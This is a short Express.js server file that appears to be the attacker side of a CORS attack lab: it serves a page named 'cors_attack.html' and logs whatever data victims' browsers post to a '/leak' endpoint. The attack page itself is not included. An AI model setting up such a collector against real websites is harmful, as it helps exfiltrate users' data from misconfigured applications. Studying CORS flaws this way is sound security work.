const express =  require('express');

const app = express();
const PORT = 12345;

app.use(express.urlencoded());

app.get('/', function(req, res) {
    res.sendFile(__dirname + '/cors_attack.html');
});

app.post('/leak', function(req, res) {
    var leakedData = req.body.data;
    console.log(leakedData);
});

var server = app.listen(PORT, function(){
    var host = server.address().address;
    var port = server.address().port;

    console.log('PM System app listening at http://%s:%s', host, port);
});




